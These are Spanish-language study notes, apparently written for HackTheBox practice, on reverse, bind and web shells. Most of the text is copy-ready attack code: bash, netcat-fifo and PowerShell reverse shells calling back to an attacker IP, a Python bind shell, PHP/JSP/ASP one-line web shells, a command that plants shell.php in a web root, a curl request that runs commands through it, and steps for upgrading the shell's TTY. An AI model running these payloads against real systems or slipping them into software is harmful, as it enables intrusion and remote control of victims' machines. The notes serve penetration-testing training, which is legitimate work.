# Apuntes resumidos: Tipos de Conchas (Shells)

## 1) Tipos principales
| Tipo            | Comunicación                               | Uso común |
|-----------------|-------------------------------------------|-----------|
| **Reverse**     | El host comprometido **se conecta a nosotros** | Rápido y común |
| **Bind**        | El host comprometido **escucha**, nosotros nos conectamos | Persistencia local |
| **Web**         | Comandos vía **HTTP** en scripts (PHP/JSP/ASP) | Evita firewall y puertos bloqueados |

---

## 2) Reverse Shell
### Paso 1: Iniciar listener en atacante
```bash
nc -lvnp 1234
```

### Paso 2: obtener IP VPN
```bash
ip a     # usar tun0 para HTB
```

### Paso 3: ejecutar payload en víctima
Linux (bash):
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
Alternativo:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

Windows (PowerShell):
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

---

## 3) Bind Shell
Ejecutar payload en víctima para escuchar:
Linux:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
Python:
```python
python -c 'import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())'
```

Conectar desde atacante:
```bash
nc <IP_victima> 1234
```

---

## 4) Web Shell
Ejemplos simples de script web (subir a webroot víctima):

PHP:
```php
<?php system($_REQUEST["cmd"]); ?>
```

JSP:
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

ASP:
```asp
<% eval request("cmd") %>
```

Cargar en Apache Linux:
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

Ejecutar comando (navegador o cURL):
```bash
curl http://SERVER_IP/shell.php?cmd=id
```

---

## 5) Mejorar TTY en shells obtenidas con netcat
En víctima (dentro de shell):
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
Suspender con Ctrl+Z en atacante y luego:
```bash
stty raw -echo
fg
export TERM=xterm-256color
stty rows <N> columns <M>
```

---

## 6) Tips clave
- **Reverse:** rápido, pero se cae si pierde conexión.
- **Bind:** permite reconectar sin reiniciar payload.
- **Web shell:** útil si solo hay RCE web, sobre puertos 80/443.
- **Siempre mejorar TTY** para tener historial y atajos.
- **Ajustar TERM y tamaño de pantalla** tras obtener shell.
